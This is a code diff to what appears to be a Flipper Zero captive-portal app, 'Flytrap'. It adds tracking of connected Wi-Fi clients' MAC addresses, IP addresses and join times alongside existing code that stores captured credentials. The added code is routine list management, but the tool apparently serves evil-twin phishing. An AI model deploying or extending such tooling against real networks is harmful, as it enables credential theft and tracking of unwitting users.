@@ -36,6 +36,79 @@ static void store_cred(FlytrapApp* app, const char* kv) {
     notify_capture(app);
 }
 
+// Copy the value of "<key>" (e.g. "mac=") from a line into out, stopping at a
+// space, '&', or end. out is always NUL-terminated.
+static void extract_kv(const char* line, const char* key, char* out, size_t n) {
+    out[0] = '\0';
+    const char* p = strstr(line, key);
+    if(!p) return;
+    p += strlen(key);
+    size_t i = 0;
+    while(*p && *p != ' ' && *p != '&' && i < n - 1) out[i++] = *p++;
+    out[i] = '\0';
+}
+
+static int client_find(FlytrapApp* app, const char* mac) {
+    for(uint16_t i = 0; i < app->client_count; i++) {
+        if(strcmp(app->clients[i].mac, mac) == 0) return (int)i;
+    }
+    return -1;
+}
+
+static void client_join(FlytrapApp* app, const char* mac) {
+    if(mac[0] == '\0' || client_find(app, mac) >= 0) return; // unknown or already tracked
+    if(app->client_count >= FLYTRAP_CLIENT_SLOTS) return; // full; drop silently
+    FlytrapClient* c = &app->clients[app->client_count++];
+    strncpy(c->mac, mac, sizeof(c->mac) - 1);
+    c->mac[sizeof(c->mac) - 1] = '\0';
+    c->ip[0] = '\0';
+    DateTime dt;
+    furi_hal_rtc_get_datetime(&dt);
+    snprintf(c->when, sizeof(c->when), "%02u:%02u:%02u", dt.hour, dt.minute, dt.second);
+    app->clients_rev++;
+}
+
+static void client_leave(FlytrapApp* app, const char* mac) {
+    int idx = client_find(app, mac);
+    if(idx < 0) return;
+    for(uint16_t i = (uint16_t)idx; i + 1 < app->client_count; i++) {
+        app->clients[i] = app->clients[i + 1];
+    }
+    app->client_count--;
+    if(app->selected_client >= app->client_count && app->selected_client > 0) {
+        app->selected_client--;
+    }
+    app->clients_rev++;
+}
+
+static void client_store_ip_at(FlytrapApp* app, int idx, const char* ip) {
+    strncpy(app->clients[idx].ip, ip, sizeof(app->clients[idx].ip) - 1);
+    app->clients[idx].ip[sizeof(app->clients[idx].ip) - 1] = '\0';
+    app->clients_rev++;
+}
+
+static void client_set_ip(FlytrapApp* app, const char* mac, const char* ip) {
+    int idx = client_find(app, mac);
+    if(idx < 0) {
+        // IP arrived before we saw the join — create the entry so it isn't lost.
+        client_join(app, mac);
+        idx = client_find(app, mac);
+        if(idx < 0) return;
+    }
+    client_store_ip_at(app, idx, ip);
+}
+
+// Firmware couldn't resolve the MAC: attach the IP to the most recent client
+// that doesn't have one yet (joins are near-instantly followed by DHCP).
+static void client_set_ip_newest(FlytrapApp* app, const char* ip) {
+    for(int i = (int)app->client_count - 1; i >= 0; i--) {
+        if(app->clients[i].ip[0] == '\0') {
+            client_store_ip_at(app, i, ip);
+            return;
+        }
+    }
+}
+
 static void append_raw(FlytrapApp* app, const char* line) {
     furi_string_cat_str(app->session_raw, line);
     furi_string_cat_str(app->session_raw, "\n");
@@ -63,10 +136,30 @@ static void process_line(FlytrapApp* app, const char* line) {
             app->portal_running = false;
         } else if(strncmp(tok, "boot", 4) == 0) {
             if(app->session_active) app->need_restart = true;
+            // The AP restarted, so every station dropped — clear the live list
+            // (the ESP won't send BYE for connections lost to its reboot).
+            app->client_count = 0;
+            app->selected_client = 0;
+            app->clients_rev++;
         }
     } else if(strncmp(line, "HIT", 3) == 0) {
-        // may carry "mac=.." (visible in the raw console); count is enough here
-        app->client_count++;
+        char mac[18];
+        extract_kv(line, "mac=", mac, sizeof(mac));
+        client_join(app, mac);
+    } else if(strncmp(line, "BYE", 3) == 0) {
+        char mac[18];
+        extract_kv(line, "mac=", mac, sizeof(mac));
+        client_leave(app, mac);
+    } else if(strncmp(line, "IP ", 3) == 0) {
+        char mac[18], ip[20];
+        extract_kv(line, "mac=", mac, sizeof(mac));
+        extract_kv(line, "ip=", ip, sizeof(ip));
+        if(ip[0]) {
+            if(mac[0])
+                client_set_ip(app, mac, ip);
+            else
+                client_set_ip_newest(app, ip);
+        }
     } else if(strncmp(line, "CRED ", 5) == 0) {
         store_cred(app, line + 5);
     } else if(strncmp(line, "u: ", 3) == 0) {
@@ -133,6 +226,8 @@ void flytrap_session_start(FlytrapApp* app) {
     app->cap_count = 0;
     app->cap_head = 0;
     app->client_count = 0;
+    app->clients_rev = 0;
+    app->selected_client = 0;
     app->portal_running = false;
     app->pending_setap = false;
     app->need_restart = false;
